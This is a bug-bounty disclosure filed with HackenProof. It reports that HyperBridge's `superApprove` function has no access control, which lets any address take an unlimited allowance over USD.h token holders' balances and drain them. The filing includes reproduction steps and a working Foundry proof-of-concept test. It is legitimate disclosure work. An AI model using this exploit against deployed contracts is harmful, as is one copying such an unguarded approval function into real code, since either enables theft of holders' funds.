# HackenProof Filing — HyperBridge `superApprove` Unrestricted Allowance

Filed: 2026-11-08 (confirmation: Sun Nov 8, 1:18 PM EST, `no-reply@hackenproof.com`).
Status at filing: submitted, awaiting triage per program SLA.

## Severity

High (mechanism is Critical-grade; filed as High because the deployed instance is the USD.h fee token on non-mainnet chains — see notes)

## Affected contract

polytope-labs/hyperbridge, `evm/src/utils/HyperFungibleTokenImpl.sol:115`, function `superApprove(address owner, address spender)`. Verified 2026-11-08 against commit `b04bee03e4dd0b1c5958836994aabf2dfc09aa38`. The function is byte-identical to the Oct 21, 2026 pin `5a8f171`.

## Description

`superApprove` is public with no access control. It calls `_approve(owner, spender, type(uint256).max)` with the owner address supplied entirely by the caller. Any address — holding no role of any kind — can grant itself an unlimited allowance over ANY token holder's balance, then drain that balance with a standard `transferFrom`. There is no role check, no signature, and no validation that the caller is the owner.

## Impact

Complete theft of any HyperFungibleTokenImpl (USD.h fee token) holder's balance by any stranger EOA.

## Steps to reproduce

1. Deploy HyperFungibleTokenImpl (name "Hyper USD", symbol "USD.h") and mint 1,000 tokens to a victim address.
2. As an attacker address holding no roles, call `superApprove(victim, attacker)`.
3. `allowance(victim, attacker)` now equals `type(uint256).max`.
4. As the attacker, call `transferFrom(victim, attacker, 1000 ether)`.
5. Victim balance is 0; attacker balance is 1,000.

## Notes for triage (stated honestly)

The function's comment reads "Helper function for tests" and in-repo tests use it. It nonetheless ships in `src/` (not `tests/`) and is deployed by the official `DeployIsmp.s.sol` script as the USD.h fee token (non-mainnet branch; on mainnet the fee token comes from config). The finding was re-verified on 2026-11-08 at the commit above; do not treat the Oct 21 date as the discovery date for the 24-hour rule — Nov 8, 2026 is the honest re-verification date.

## Proof of concept (Foundry test)

Run with `forge test --match-test test_P1_superApprove_drains_victim` against the pinned sources; imports the exact in-scope file:

```solidity
// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.30;
import {Test} from "forge-std/Test.sol";
import {HyperFungibleTokenImpl} from "hyperbridge-src/utils/HyperFungibleTokenImpl.sol";
contract HBL1Test is Test {
HyperFungibleTokenImpl token;
address victim = address(0x1001);
address attacker = address(0x2002);
function setUp() public {
token = new HyperFungibleTokenImpl(address(this), "Hyper USD", "USD.h");
token.grantMinterRole(address(this));
token.mint(victim, 1000 ether);
}
function test_P1_superApprove_drains_victim() public {
assertEq(token.balanceOf(victim), 1000 ether);
vm.prank(attacker);
token.superApprove(victim, attacker);
assertEq(token.allowance(victim, attacker), type(uint256).max);
vm.prank(attacker);
token.transferFrom(victim, attacker, 1000 ether);
assertEq(token.balanceOf(victim), 0);
assertEq(token.balanceOf(attacker), 1000 ether);
}
}
```

## Validation steps

1. Deploy HyperFungibleTokenImpl (name "Hyper USD", symbol "USD.h") and mint 1,000 tokens to a victim address.
2. As an attacker address holding no roles, call `superApprove(victim, attacker)`.
3. Check `allowance(victim, attacker)` — it equals `type(uint256).max`.
4. As the attacker, call `transferFrom(victim, attacker, 1000 ether)`.
5. Victim balance is 0; attacker balance is 1,000. Alternatively run the Foundry PoC in the Vulnerability details: `forge test --match-test test_P1_superApprove_drains_victim`
